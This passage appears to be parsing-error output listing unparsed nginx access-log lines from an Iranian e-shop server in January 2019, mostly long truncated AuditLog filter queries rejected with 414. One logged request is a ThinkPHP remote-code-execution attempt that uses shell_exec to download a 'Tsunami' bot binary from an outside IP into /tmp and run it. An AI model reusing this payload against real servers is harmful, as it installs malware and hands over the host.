71,%201198475,%201201615,%201202495,%201205934,%201211527,%201211874,%201213091,%201216191,%201218903,%201219263,%201221659,%201226667,%201231955,%201236694,%201248311,%201255181,%201269633,%201272922,%201281074,%201281437,%201285407,%201286956,%201290806,%201293056,%201299222,%201305782,%201309655,%201324754,%201325222,%201336319,%201336640,%201339820,%201340973,%201355115,%201355411,%201358787,%201359282,%201373205,%201373845,%201374319,%201380112,%201391226,%201401012,%201401445,%201404173,%201404174,%201407035,%201407036,%201407123,%201407124,%201407210,%201407294,%201407377,%201407455,%201422790,%201423677,%201424244,%201424812,%201425380,%201425813,%201427651,%201428146,%201428566,%201429000,%201452356,%201452780,%201457257,%201457398,%201457998,%201478279,%201509674,%201512033,%201515807,%201531480,%201541488,%201550470,%201550907,%201551595,%201551672,%201551963,%201566195,%201567129,%201577808,%201591994,%201610269,%201612040,%201615378,%201615419,%201619857,%201633768,%201653187,%201658274,%201658280,%201658283,%201662737,%201679910,%201679957,%201681939,%201686637,%201701176,%201713106,%201746894,%201755738,%201762457,%201763068,%201771420,%201779494,%201785207,%201792944,%201797260,%201797268,%201797348,%201799197,%201802624,%201804453,%201806902,%201812068,%201816857,%201830995,%201835850,%201842395,%201848154,%201851428,%201851674,%201856366,%201856700,%201862895,%201862994,%201863208,%201864546,%201867539,%201870489,%201870684,%201873018,%201882018,%201883315,%201885948,%201892480,%201892542,%201893650,%201893674,%201894577,%201894979,%201896734,%201896785,%201896842,%201903467,%201904569,%201904984,%201905159,%201905830,%201906126,%201906545,%201907453,%201907703,%201907736,%201907769,%201907808,%201910720,%201912073,%201916623,%201916776,%201917055,%201920034,%201920722,%201922613,%201922770,%201922771,%201922951,%201928655,%201931006,%201933405,%201934199,%201934206,%201934252,%201935012,%201935133,%201939151,%201940659,%201940777,%201942212,%201942270,%201949122,%201949552,%201949982,%201954484,%201957983,%201958159,%201964281,%201966531,%201972728,%201052863,%201056339,%201060139,%201060298,%201062814,%201063085,%201065202,%201065224,%201067895,%201070053,%201070752,%201074718,%201077800,%201081774,%201082095,%201082121,%201082147,%201083854,%201083881,%201090331,%201090850,%201091809,%201091869,%201091892,%201097261,%201098060,%201098085,%201099082,%201099456,%201101089,%201102657,%201103361,%201103797,%201104077,%201104147,%201104180,%201104675,%201105289,%201109521,%201111612,%201118769,%201122868,%201124486,%201129388,%201132113,%201135982,%201135991,%201141253,%201141682,%201152586,%201157245,%201185072,%201186077,%201192364,%201202496,%201205935,%201211528,%201211875,%201213092,%201216192,%201218904,%201219264,%201221660,%201226668,%201231956,%201236695,%201248312,%201255182,%201269634,%201272923,%201281075,%201281438,%201285408,%201286957,%201290807,%201293057,%201299223,%201305783,%201309656,%201325223,%201336320,%201336325,%201339821,%201339832,%201355116,%201355412,%201358788,%201359283,%201373207,%201373847,%201374321,%201380114,%201391228,%201401014,%201401447,%201404175,%201404176,%201407037,%201407038,%201407125,%201407126,%201407212,%201407296,%201407379,%201407457,%201422792,%201423679,%201424246,%201424814,%201425382,%201425815,%201427653,%201428148,%201428568,%201429002,%201452358,%201452782,%201457259,%201457400,%201458000,%201478281,%201531482,%201541490,%201550472,%201550909,%201551597,%201551674,%201551967,%201566197,%201567131,%201577810,%201591996,%201610271,%201612042,%201615380,%201615421,%201619859,%201633770,%201653189,%201658276,%201658282,%201658285,%201662739,%201679912,%201679959,%201681941,%201686649,%201701178,%201713108,%201746896,%201755740,%201762459,%201763072,%201771422,%201779496,%201785213,%201792946,%201797262,%201797270,%201797350,%201799199,%201802626,%201804455,%201806904,%201812070,%201816859,%201830997,%201835852,%201842397,%201848156,%201851430,%201851676,%201856368,%201856702,%201862897,%201862996,%201863210,%201864548,%201867541,%201870491,%201870686,%201873020,%201882020,%201883317,%201885950,%201892482,%201892544,%201893652,%201893680,%201894579,%201894981,%201896736,%201896787,%201896844,%201903469,%201904571,%201904986,%201905161,%201905832,%201906128,%201906547,%201907455,%201907705,%201907738,%201907771,%201907810,%201910722,%201912075,%201916625,%201916778,%201917057,%201920\" 414 186 \"-\" \"-\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 116.65.89.179 - - [23/Jan/2019:09:38:23 +0330] \"GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86' HTTP/1.1\" 400 166 \"-\" \"Tsunami/2.0\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 91.99.30.32 - - [23/Jan/2019:09:45:24 +0330] \"GET /rapidGrails/jsonList?maxColumns=10&domainClass=eshop.AuditLog&filter=[{op:and,data:[{op:%27isNotNull%27,%20field:%27actor%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27actor%27,%20val:%27system%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:or,data:[{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Product%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Product%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27persistedObjectId%27,%20val:9103},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27propertyName%27,%20val:%27isSynchronized%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27propertyName%27,%20val:%27visitCount%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Variation%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Variation%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[23228,%2061448,%2061449,%2061450,%2061461]}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.ProductModel%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27ProductModel%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[15503,%2015504]}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Price%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Price%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[88510,%2090111,%2092944,%20121366,%20121446,%20124092,%20130052,%20257155,%20319972,%20320568,%20341312,%20347500,%20387843,%20413773,%20421310,%20421462,%20425250,%20445328,%20504509,%20504510,%20509896,%20513117,%20513613,%20516806,%20518672,%20529249,%20550946,%20553838,%20564459,%20564482,%20564505,%20568654,%20568686,%20568709,%20568733,%20568757,%20568785,%20568808,%20569422,%20569445,%20576760,%20590017,%20592895,%20616123,%20645832,%20727654,%20741325,%20774325,%20774540,%20775973,%20785148,%20790007,%20790050,%20790093,%20790136,%20790179,%20790222,%20790265,%20790308,%20790351,%20790394,%20790437,%20790480,%20790523,%20790566,%20803147,%20815335,%20817410,%20824261,%20824262,%20849125,%20849413,%20849455,%20849496,%20849536,%20849575,%20849613,%20849650,%20849686,%20849721,%20849755,%20849788,%20849820,%20896020,%20924813,%20952339,%20952367,%20952395,%20952423,%20952451,%20952479,%20965167,%20980115,%20989118,%20989125,%201019363,%201021710,%201023616,%201024837,%201024917,%201028277,%201045742,%201053292,%201058499,%201058603,%201072508,%201082755,%201082843,%201089360,%201095251,%201109859,%201133106,%201159321,%201159616,%201159689,%201163551,%201163624,%201163698,%201163771,%201163843,%201163913,%201166793,%201166862,%201166931,%201167143,%201185124,%201191706,%201204943,%201220745,%201229475,%201234154,%201239180,%201254328,%201310665,%201318685,%201318866,%201318869,%201319331,%201341077,%201342259,%201349733,%201375595,%201410807,%201422061,%201430180,%201436511,%201438435,%201439336,%201439484,%201442351,%201444123,%201459962,%201460279,%201472352,%201472670,%201476319,%201476348,%201476377,%201476407,%201476835,%201476888,%201476917,%201480938,%201487157,%201489097,%201495473,%201509217,%201512877,%201512886,%201512897,%201512911,%201512926,%201512943,%201512963,%201512985,%201513008,%201513034,%201513062,%201513090,%201513120,%201513149,%201513842,%201513874,%201520644,%201523425,%201524024,%201524051,%201524052,%201530700,%201530718,%201539844,%201545908,%201564704,%201564745,%201565899,%201570357,%201570418,%201574436,%201579448,%201589699,%201594691,%201596664,%201601882,%201620684,%201656976,%201688033,%201702050,%201713360,%201732681,%201743714,%201763346,%201779832,%201785697,%201800631,%201800670,%201817045,%201818196,%201818223,%201818250,%201818284,%201818315,%201818316,%201818348,%201818379,%201818410,%201818450,%201818482,%201818522,%201818554,%201818585,%201824077,%201835567,%201836727,%201836755,%201837933,%201837983,%201838803,%201848063,%201850593,%201851102,%201853977,%201854067,%201854991,%201855053,%201855170,%201856037,%201856625,%201856880,%201856962,%201856974,%201857003,%201857191,%201859427,%201859428,%201863619,%201868735,%201871516,%201871544,%201873427,%201873544,%201873606,%201875938,%201875999,%201876060,%201876121,%201876182,%201876455,%201877519,%201877581,%201877582,%201879447,%201880307,%201882561,%201882641,%201882649,%201882651,%201883595,%201889476,%201893353,%201894172,%201902553,%201903836,%201909254,%201921090,%201921163,%201921273,%201930633,%201944604,%201954313,%201968157,%201970363,%201970676,%201973196,%201973202,%201973223,%201973574,%2088511,%20121367,%20121445,%20124093,%20130053,%20257156,%20301334,%20305696,%20319973,%20320569,%20347501,%20387844,%20413774,%20421311,%20421463,%20425251,%20445329,%20504511,%20504512,%20509897,%20513118,%20513614,%20516807,%20518673,%20529250,%20550947,%20553839,%20564460,%20564483,%20564506,%20568655,%20568687,%20568710,%20568734,%20568758,%20568786,%20568809,%20569423,%20569446,%20576761,%20590018,%20592896,%20616124,%20645833,%20727655,%20741326,%20774326,%20774541,%20775974,%20785149,%20790008,%20790051,%20790094,%20790137,%20790180,%20790223,%20790266,%20790309,%20790352,%20790395,%20790438,%20790481,%20790524,%20790567,%20803148,%20815336,%20817411,%20824263,%20824264,%20849126,%20849414,%20849456,%20849497,%20849537,%20849576,%20849614,%20849651,%20849687,%20849722,%20849756,%20849789,%20849821,%20896021,%20924814,%20952340,%20952368,%20952396,%20952424,%20952452,%20952480,%20965168,%20980116,%20989119,%20989126,%20989828,%20994026,%201021711,%201022006,%201024838,%201024918,%201045743,%201053293,%201058500,%201058604,%201072509,%201082756,%201082844,%201089361,%201095252,%201109860,%201133107,%201159322,%201159617,%201159690,%201163552,%201163625,%201163699,%201163772,%201163844,%201163914,%201166794,%201166863,%201166932,%201167144,%201185125,%201185184,%201191707,%201220746,%201229476,%201234155,%201239181,%201254329,%201310666,%201318686,%201341078,%201342260,%201349734,%201375597,%201410809,%201422063,%201430182,%201436513,%201438437,%201439338,%201439486,%201442353,%201444125,%201459964,%201460281,%201472354,%201472672,%201476321,%201476350,%201476379,%201476409,%201476837,%201476890,%201476919,%201480940,%201487159,%201489099,%201495475,%201509219,%201512879,%201512888,%201512899,%201512913,%201512928,%201512945,%201512965,%201512987,%201513010,%201513036,%201513064,%201513092,%201513122,%201513151,%201513844,%201513876,%201520646,%201523427,%201524026,%201524054,%201524055,%201524081,%201524107,%201524108,%201524134,%201524159,%201524160,%201524186,%201524211,%201524212,%201524238,%201524240,%201530702,%201530722,%201539846,%201545910,%201564706,%201564747,%201565901,%201570359,%201570420,%201574438,%201579450,%201589701,%201594693,%201596666,%201601884,%201620686,%201656978,%201688039,%201702052,%201713362,%201\" 414 186 \"-\" \"-\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 94.183.88.223 - - [23/Jan/2019:11:10:38 +0330] \"G\" 400 0 \"-\" \"-\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 94.183.88.223 - - [23/Jan/2019:11:10:41 +0330] \"G\" 400 0 \"-\" \"-\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 94.183.88.223 - - [23/Jan/2019:11:11:00 +0330] \"G\" 400 0 \"-\" \"-\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 94.183.88.223 - - [23/Jan/2019:11:12:15 +0330] \"G\" 400 0 \"-\" \"-\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 91.99.30.32 - - [23/Jan/2019:11:21:09 +0330] \"GET /rapidGrails/jsonList?maxColumns=10&domainClass=eshop.AuditLog&filter=[{op:and,data:[{op:%27isNotNull%27,%20field:%27actor%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27actor%27,%20val:%27system%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:or,data:[{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Product%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Product%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27persistedObjectId%27,%20val:28695},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27propertyName%27,%20val:%27isSynchronized%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27propertyName%27,%20val:%27visitCount%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Variation%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Variation%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[60339,%2060340,%2060341,%2060342,%2060343]}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.ProductModel%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27ProductModel%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[57553,%2057554]}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Price%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Price%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[971975,%20972038,%20972607,%20973938,%20973983,%20976269,%20976314,%20976358,%20976360,%20977084,%20993195,%20995124,%201014628,%201022250,%201026898,%201029800,%201034842,%201043839,%201043981,%201050142,%201058394,%201059107,%201065086,%201071360,%201072809,%201077693,%201080968,%201081554,%201081598,%201085242,%201090306,%201090624,%201090751,%201090817,%201092177,%201092300,%201098121,%201098252,%201098296,%201098382,%201098481,%201098886,%201098926,%201101446,%201101526,%201101527,%201101538,%201101554,%201103330,%201103770,%201104041,%201104111,%201104639,%201111447,%201119049,%201124764,%201124838,%201125027,%201125056,%201126710,%201129653,%201138582,%201139701,%201140997,%201141065,%201141133,%201142407,%201142475,%201142543,%201142611,%201142679,%201143486,%201143558,%201143610,%201143690,%201145720,%201151588,%201151693,%201151743,%201151774,%201155868,%201157122,%201157151,%201157562,%201159512,%201159545,%201161079,%201161112,%201165255,%201165288,%201165321,%201166531,%201166564,%201166965,%201173826,%201177632,%201177710,%201177788,%201177866,%201177944,%201184009,%201184086,%201184163,%201184240,%201185421,%201186820,%201188131,%201188199,%201188298,%201188365,%201188589,%201188655,%201188723,%201188788,%201188855,%201188919,%201188983,%201189049,%201189112,%201189177,%201189239,%201189303,%201189364,%201189427,%201189487,%201189549,%201189608,%201189669,%201189727,%201189785,%201189845,%201189902,%201189961,%201190017,%201190075,%201190130,%201190187,%201190243,%201190296,%201190614,%201190666,%201190719,%201190770,%201193829,%201194300,%201194372,%201195733,%201195793,%201197101,%201197179,%201199593,%201199689,%201201137,%201205487,%201205619,%201209138,%201212273,%201216417,%201217601,%201220286,%201227099,%201227577,%201227658,%201230556,%201230636,%201230716,%201231894,%201233246,%201235305,%201239013,%201239581,%201244210,%201244997,%201245036,%201247825,%201247864,%201247908,%201247946,%201247986,%201248025,%201248061,%201248099,%201248134,%201248171,%201248205,%201248222,%201248223,%201248290,%201248304,%201250200,%201251286,%201253284,%201255778,%201258705,%201261106,%201269467,%201271628,%201276510,%201282398,%201285898,%201289743,%201290486,%201292460,%201297331,%201297424,%201297485,%201297574,%201300610,%201301453,%201305423,%201314309,%201325869,%201334363,%201334474,%201334734,%201336658,%201337480,%201337849,%201338703,%201354426,%201354484,%201366655,%201367149,%201368595,%201369065,%201395077,%201395710,%201398295,%201421533,%201431299,%201432654,%201434907,%201451767,%201470854,%201471349,%201496627,%201511193,%201529040,%201539440,%201548739,%201566811,%201579099,%201592694,%201593267,%201593409,%201596030,%201597731,%201610880,%201628306,%201645545,%201652901,%201664669,%201688337,%201709323,%201713590,%201728286,%201728694,%201736781,%201736957,%201738226,%201742659,%201744320,%201744360,%201746854,%201746871,%201746888,%201750348,%201750802,%201755218,%201759632,%201763660,%201780350,%201786319,%201795486,%201797416,%201798309,%201799090,%201799096,%201799102,%201799107,%201800531,%201802292,%201809744,%201821461,%201824565,%201824639,%201824848,%201824930,%201825011,%201825153,%201825615,%201825702,%201826382,%201826485,%201826587,%201826815,%201826918,%201827120,%201828342,%201829556,%201829780,%201829938,%201831479,%201831585,%201831690,%201831796,%201831901,%201832006,%201832112,%201832279,%201832659,%201832660,%201833020,%201833127,%201833128,%201833236,%201835484,%201836059,%201836227,%201836337,%201836489,%201836998,%201837171,%201837282,%201837283,%201837394,%201837395,%201837721,%201838714,%201842675,%201844929,%201849733,%201853106,%201857915,%201865484,%201865719,%201865740,%201865763,%201865788,%201865816,%201865846,%201865880,%201869605,%201871191,%201873190,%201884282,%201884379,%201884658,%201884932,%201885622,%201886146,%201888073,%201896161,%201897702,%201898168,%201899563,%201900422,%201900457,%201900641,%201900792,%201901377,%201901472,%201901555,%201903891,%201904096,%201904123,%201906007,%201906431,%201915073,%201919813,%201930860,%201942538,%201953745,%201960568,%201960813,%201965127,%20971976,%20972039,%20972608,%20973939,%20973984,%20976270,%20976315,%20976317,%20977085,%20992499,%20992529,%20992552,%20992575,%20992598,%20992628,%20994137,%20995125,%201014629,%201015244,%201018342,%201019698,%201022251,%201026899,%201029801,%201034420,%201034843,%201043840,%201043982,%201050143,%201058395,%201065087,%201069316,%201069342,%201069368,%201069978,%201070005,%201071044,%201071361,%201072810,%201077694,%201080969,%201081555,%201081599,%201085243,%201090307,%201090625,%201090752,%201090818,%201092178,%201092301,%201098122,%201098253,%201098297,%201098383,%201098482,%201098887,%201101447,%201101539,%201101555,%201103331,%201104042,%201104112,%201104640,%201111448,%201119050,%201119097,%201123636,%201124765,%201124839,%201125028,%201125057,%201126711,%201129654,%201138583,%201139702,%201140998,%201141066,%201141134,%201142408,%201142476,%201142544,%201142612,%201142680,%201143487,%201143560,%201143612,%201143691,%201145721,%201151589,%201151694,%201151744,%201151775,%201155869,%201157123,%201157152,%201157563,%201159513,%201159546,%201161080,%201161113,%201165256,%201165289,%201165322,%201166532,%201166565,%201166966,%201173827,%201177633,%201177711,%201177789,%201177867,%201177945,%201184010,%201184087,%201184164,%201184241,%201185422,%201186821,%201188132,%201188200,%2\" 414 186 \"-\" \"-\" \"-\"\n",
      "\n",
      "Error: Line does not match regex pattern: 91.99.30.32 - - [23/Jan/2019:11:21:57 +0330] \"GET /rapidGrails/jsonList?maxColumns=10&domainClass=eshop.AuditLog&filter=[{op:and,data:[{op:%27isNotNull%27,%20field:%27actor%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27actor%27,%20val:%27system%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:or,data:[{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Product%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Product%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27persistedObjectId%27,%20val:28695},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27propertyName%27,%20val:%27isSynchronized%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27ne%27,%20field:%27propertyName%27,%20val:%27visitCount%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Variation%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Variation%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[60339,%2060340,%2060341,%2060342,%2060343]}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.ProductModel%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27ProductModel%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[57553,%2057554]}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:or,data:[{op:%27eq%27,%20field:%27className%27,%20val:%27eshop.Price%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27eq%27,%20field:%27className%27,%20val:%27Price%27}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[971975,%20972038,%20972607,%20973938,%20973983,%20976269,%20976314,%20976358,%20976360,%20977084,%20993195,%20995124,%201014628,%201022250,%201026898,%201029800,%201034842,%201043839,%201043981,%201050142,%201058394,%201059107,%201065086,%201071360,%201072809,%201077693,%201080968,%201081554,%201081598,%201085242,%201090306,%201090624,%201090751,%201090817,%201092177,%201092300,%201098121,%201098252,%201098296,%201098382,%201098481,%201098886,%201098926,%201101446,%201101526,%201101527,%201101538,%201101554,%201103330,%201103770,%201104041,%201104111,%201104639,%201111447,%201119049,%201124764,%201124838,%201125027,%201125056,%201126710,%201129653,%201138582,%201139701,%201140997,%201141065,%201141133,%201142407,%201142475,%201142543,%201142611,%201142679,%201143486,%201143558,%201143610,%201143690,%201145720,%201151588,%201151693,%201151743,%201151774,%201155868,%201157122,%201157151,%201157562,%201159512,%201159545,%201161079,%201161112,%201165255,%201165288,%201165321,%201166531,%201166564,%201166965,%201173826,%201177632,%201177710,%201177788,%201177866,%201177944,%201184009,%201184086,%201184163,%201184240,%201185421,%201186820,%201188131,%201188199,%201188298,%201188365,%201188589,%201188655,%201188723,%201188788,%201188855,%201188919,%201188983,%201189049,%201189112,%201189177,%201189239,%201189303,%201189364,%201189427,%201189487,%201189549,%201189608,%201189669,%201189727,%201189785,%201189845,%201189902,%201189961,%201190017,%201190075,%201190130,%201190187,%201190243,%201190296,%201190614,%201190666,%201190719,%201190770,%201193829,%201194300,%201194372,%201195733,%201195793,%201197101,%201197179,%201199593,%201199689,%201201137,%201205487,%201205619,%201209138,%201212273,%201216417,%201217601,%201220286,%201227099,%201227577,%201227658,%201230556,%201230636,%201230716,%201231894,%201233246,%201235305,%201239013,%201239581,%201244210,%201244997,%201245036,%201247825,%201247864,%201247908,%201247946,%201247986,%201248025,%201248061,%201248099,%201248134,%201248171,%201248205,%201248222,%201248223,%201248290,%201248304,%201250200,%201251286,%201253284,%201255778,%201258705,%201261106,%201269467,%201271628,%201276510,%201282398,%201285898,%201289743,%201290486,%201292460,%201297331,%201297424,%201297485,%201297574,%201300610,%201301453,%201305423,%201314309,%201325869,%201334363,%201334474,%201334734,%201336658,%201337480,%201337849,%201338703,%201354426,%201354484,%201366655,%201367149,%201368595,%201369065,%201395077,%201395710,%201398295,%201421533,%201431299,%201432654,%201434907,%201451767,%201470854,%201471349,%201496627,%201511193,%201529040,%201539440,%201548739,%201566811,%201579099,%201592694,%201593267,%201593409,%201596030,%201597731,%201610880,%201628306,%201645545,%201652901,%201664669,%201688337,%201709323,%201713590,%201728286,%201728694,%201736781,%201736957,%201738226,%201742659,%201744320,%201744360,%201746854,%201746871,%201746888,%201750348,%201750802,%201755218,%201759632,%201763660,%201780350,%201786319,%201795486,%201797416,%201798309,%201799090,%201799096,%201799102,%201799107,%201800531,%201802292,%201809744,%201821461,%201824565,%201824639,%201824848,%201824930,%201825011,%201825153,%201825615,%201825702,%201826382,%201826485,%201826587,%201826815,%201826918,%201827120,%201828342,%201829556,%201829780,%201829938,%201831479,%201831585,%201831690,%201831796,%201831901,%201832006,%201832112,%201832279,%201832659,%201832660,%201833020,%201833127,%201833128,%201833236,%201835484,%201836059,%201836227,%201836337,%201836489,%201836998,%201837171,%201837282,%201837283,%201837394,%201837395,%201837721,%201838714,%201842675,%201844929,%201849733,%201853106,%201857915,%201865484,%201865719,%201865740,%201865763,%201865788,%201865816,%201865846,%201865880,%201869605,%201871191,%201873190,%201884282,%201884379,%201884658,%201884932,%201885622,%201886146,%201888073,%201896161,%201897702,%201898168,%201899563,%201900422,%201900457,%201900641,%201900792,%201901377,%201901472,%201901555,%201903891,%201904096,%201904123,%201906007,%201906431,%201915073,%201919813,%201930860,%201942538,%201953745,%201960568,%201960813,%201965127,%20971976,%20972039,%20972608,%20973939,%20973984,%20976270,%20976315,%20976317,%20977085,%20992499,%20992529,%20992552,%20992575,%20992598,%20992628,%20994137,%20995125,%201014629,%201015244,%201018342,%201019698,%201022251,%201026899,%201029801,%201034420,%201034843,%201043840,%201043982,%201050143,%201058395,%201065087,%201069316,%20